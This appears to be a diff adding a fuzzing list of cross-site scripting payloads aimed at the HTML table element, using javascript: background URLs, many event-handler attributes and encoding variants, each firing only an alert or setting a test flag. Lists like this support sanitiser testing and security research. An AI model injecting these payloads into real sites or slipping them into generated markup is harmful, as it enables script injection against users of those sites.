@@ -1,0 +1,60 @@
+<TABLE BACKGROUND="javascript:alert(1040)">
+<table background='javascript.:alert(14)'></table>
+<TABLE BACKGROUND="javascript:alert(1674)">
+<TABLE BACKGROUND="javascript:alert(1800)">
+<;TABLE BACKGROUND=";javascript:alert(1902)";>;<;/TABLE>;
+<TABLE BACKGROUND="javascript.:alert(256)">
+<TABLE BACKGROUND="javascript:alert(760)">
+<TABLE BACKGROUND="javascript:alert(949)">
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<;TABLE BACKGROUND=";javascript:alert(';XSS';)";>;<;/TABLE>;
+<table BACKGROUND="javascript:document.vulnerable=true;">
+<table background="javascript:javascript:alert(1)">
+<TABLE BACKGROUND="javascript:javascript:alert(1)">
+<table background="javascript:javascript:alert(1488)">
+<TABLE BACKGROUND="javascript:javascript:alert(1595)">
+<table background="javascript:javascript:alert(574)">
+<TABLE BACKGROUND="javascript:javascript:alert(681)">
+<table draggable="true" ondrag="alert(1)">test</table>
+<table draggable="true" ondragend="alert(1)">test</table>
+<table draggable="true" ondragenter="alert(1)">test</table>
+<table draggable="true" ondragleave="alert(1)">test</table>
+<table draggable="true" ondragstart="alert(1)">test</table>
+<table id=x tabindex=1 onactivate=alert(1)></table>
+<table id=x tabindex=1 onbeforeactivate=alert(1)></table>
+<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>
+<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>
+<table id=x tabindex=1 onfocus=alert(1)></table>
+<table id=x tabindex=1 onfocusin=alert(1)></table>
+<table onbeforecopy="alert(1)" contenteditable>test</table>
+<table onbeforecut="alert(1)" contenteditable>test</table>
+<table onbeforepaste="alert(1)" contenteditable>test</table>
+<table onblur=alert(1) tabindex=1 id=x></table><input autofocus>
+<table onclick="alert(1)">test</table>
+<table oncontextmenu="alert(1)">test</table>
+<table oncopy="alert(1)" contenteditable>test</table>
+<table oncut="alert(1)" contenteditable>test</table>
+<table ondblclick="alert(1)">test</table>
+<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>
+<table onkeydown="alert(1)" contenteditable>test</table>
+<table onkeypress="alert(1)" contenteditable>test</table>
+<table onkeyup="alert(1)" contenteditable>test</table>
+<table onmousedown="alert(1)">test</table>
+<table onmouseenter="alert(1)">test</table>
+<table onmouseleave="alert(1)">test</table>
+<table onmousemove="alert(1)">test</table>
+<table onmouseout="alert(1)">test</table>
+<table onmouseover="alert(1)">test</table>
+<table onmouseup="alert(1)">test</table>
+<table onpaste="alert(1)" contenteditable>test</table>
+<TABLE><TD BACKGROUND="javascript:alert(1041)">
+<TABLE><TD BACKGROUND="javascript:alert(1675)">
+<;TABLE>;<;TD BACKGROUND=";javascript:alert(1903)";>;<;/TD>;<;/TABLE>;
+<TABLE><TD BACKGROUND="javascript:alert(761)">
+<TABLE><TD BACKGROUND="javascript:alert(950)">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<;TABLE>;<;TD BACKGROUND=";javascript:alert(';XSS';)";>;<;/TD>;<;/TABLE>;
+<table><TD BACKGROUND="javascript:document.vulnerable=true;">
+<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
+<TABLE><TD BACKGROUND="javascript:javascript:alert(1596)">
+<TABLE><TD BACKGROUND="javascript:javascript:alert(682)">
